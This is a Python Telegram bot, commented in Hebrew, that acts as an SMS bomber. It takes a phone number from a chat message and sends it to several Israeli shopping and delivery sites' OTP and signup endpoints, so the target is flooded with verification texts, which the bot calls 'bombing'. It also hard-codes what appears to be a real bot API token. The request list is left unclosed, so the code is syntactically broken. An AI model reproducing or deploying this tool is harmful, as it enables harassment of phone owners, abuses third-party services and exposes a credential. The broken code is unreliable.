import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os

app = Flask('')
@app.route('/')
def home(): return "Bot is Running"
def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()
# הטוקן שלך
API_TOKEN = '8788411826:AAEQdmRx5OVFB91zjRJrEaMJFghDp8Tayg0'
bot = telebot.TeleBot(API_TOKEN)

def attack(target):
    # רשימת המוקדים
    apis = [
        {"u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target}},
        {"u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target}},
        {"u": "https://www.terminalx.com/api/v1/auth/otp/send", "d": {"phone": target}},
        {"u": "https://api.yellow.co.il/v1/auth/login", "d": {"phone": target}},
        {"u": "https://wolt.com/api/v1/user/check_phone_number", "d": {"phone_number": target}},
        {"u": "https://ksp.co.il/api/v1/auth/otp", "d": {"phone": target}},
       {"u":  "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target}},
    {
            "u": "https://api.flashy.app/thunder/contact?overwrite=true&primary_key=email", 
            "d": {
                "email": f"user_{target}@gmail.com",
                "signup_source": "welcome",
                "phone": target,
                "lists": {"15304": True},
                "popup_id": 18260,
                "flsid": None
            }
        },
    for site in apis:
        try:
            requests.post(site["u"], json=site["d"], timeout=5)
        except:
            pass

@bot.message_handler(func=lambda m: True)
def handle(m):
    target = m.text.strip()
    if target.isdigit() and len(target) >= 10:
        bot.reply_to(m, f"🚀 מתחיל להפציץ את {target}...")
        for _ in range(1):
            attack(target)
            time.sleep(1)
        bot.send_message(m.chat.id, "✅ הסבב הסתיים!")
    else:
        bot.reply_to(m, "שלח מספר טלפון תקין")

print("--- BOT IS READY ---")
keep_alive()
bot.infinity_polling()
